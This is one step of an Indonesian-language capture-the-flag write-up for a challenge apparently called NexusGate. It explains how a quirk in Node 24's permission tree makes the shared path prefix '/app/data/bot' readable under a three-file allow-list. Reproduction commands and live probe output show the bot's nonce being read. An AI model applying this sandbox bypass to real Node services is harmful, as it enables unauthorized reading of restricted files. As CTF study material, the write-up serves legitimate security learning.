# NexusGate — File-read sandbox: Node permission tree

[← Overview](50-nexusgate.md) · [Index](index.md)

> **Langkah 5/12 — File-read sandbox: Node permission tree.** Allow-list hanya tiga file.
>
> **Titik penting:** 127.0.0.1
>
> **Berikutnya:** [Analisis](50-nexusgate-06-analisis.md)

## 2.3 File-read sandbox: Node permission tree

`routes.js`:

```js
if (pathname === '/internal/console/files' && req.method === 'POST') {
  readBody((body) => {
    const { token, path: filePath, journal: juser } = parseBody(body);
    if (token !== PHASE_TOKEN) return json(403, { err: 'invalid token' });
    if (!filePath) return json(400, { err: 'path required' });
    const out = spawnSync(process.execPath, [
      '--permission',
      '--allow-fs-read=/app/data/bot1.json',
      '--allow-fs-read=/app/data/bot2.json',
      '--allow-fs-read=/app/data/bot3.json',
      '-e',
      'try{console.log(require("fs").readFileSync(process.env.NX_TARGET,"utf8"))}catch(e){console.log("ERR:"+e.code)}',
    ], {
      env: { NX_TARGET: filePath, PATH: process.env.PATH },
      encoding: 'utf8',
      timeout: 5000,
    });
    const text = (out.stdout || '').trim() || (out.stderr || '').trim();
    if (juser) journal(juser, `file read: ${filePath} -> ${text}`);
    json(200, { ok: true });
  });
  return;
}
```

Allow-list hanya tiga file. Namun Node 24.14.0 memiliki perilaku permission tree: ketika beberapa path di-allow, node prefix bersama dari path-path itu menjadi “directory” yang readable. Common prefix dari:

```text
/app/data/bot1.json
/app/data/bot2.json
/app/data/bot3.json
```

adalah `/app/data/bot`. File `/app/data/bot` ditulis oleh bot:

`bot.js`:

```js
const nonce = crypto.randomBytes(8).toString('hex');
const req = http.get({
  host: '127.0.0.1',
  port: 80,
  path: `/tickets/latest?aud=${nonce}`,
  headers: { cookie: botCookie, 'user-agent': 'nx-audit-bot/1.0',
             accept: 'text/html,application/xhtml+xml' },
}, (res) => {
  res.resume();
  res.on('end', () => {
    try { fs.writeFileSync('/app/data/bot', nonce); } catch (_) {}
  });
});
```

Jadi `/app/data/bot` berisi nonce terakhir yang dipakai bot.

Kami mereproduksi perilaku ini secara lokal dengan Node v24.14.0:

```bash
N=/tmp/opencode/node-v24.14.0-linux-x64/bin/node
mkdir -p /tmp/opencode/ngtest/data
cd /tmp/opencode/ngtest
echo '{"shard":1}' > data/bot1.json
echo '{"shard":2}' > data/bot2.json
echo '{"shard":3}' > data/bot3.json
printf 'deadbeefcafebabe' > data/bot

NX_TARGET=/tmp/opencode/ngtest/data/bot \
$N --permission \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot1.json \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot2.json \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot3.json \
   -e 'try{console.log(require("fs").readFileSync(process.env.NX_TARGET,"utf8"))}catch(e){console.log("ERR:"+e.code)}'
```

Output:

```text
deadbeefcafebabe
```

Dengan hanya satu allow-list entry, `/data/bot` ditolak; dengan tiga entry yang berbagi prefix, `/data/bot` diterima. Ini membuktikan root cause “permission tree” dan bukan sekadar tebakan.

Probe pada instance live:

```text
file read: /app/data/bot -> f0f6801a74026cf1
file read: /app/data/bo -> ERR:ERR_ACCESS_DENIED
file read: /app/data/b -> ERR:ERR_ACCESS_DENIED
file read: /app/data/bot1.json -> {"shard":1}
file read: /app/data/bot1.jso -> ERR:ERR_ACCESS_DENIED
file read: /app/data/botX -> ERR:ERR_ACCESS_DENIED
file read: /app/data/bot1.jsonX -> ERR:ERR_ACCESS_DENIED
file read: /app/data -> ERR:ERR_ACCESS_DENIED
```

### Evidence langkah ini

![term-source-notes.png](assets/nexusgate/term-source-notes.png)

*Terminal evidence — `source-notes.txt` (arsip transkrip sesi solve).*

**Berkas mentah langkah ini:**

- [`source-notes.txt`](assets/nexusgate/source-notes.txt)
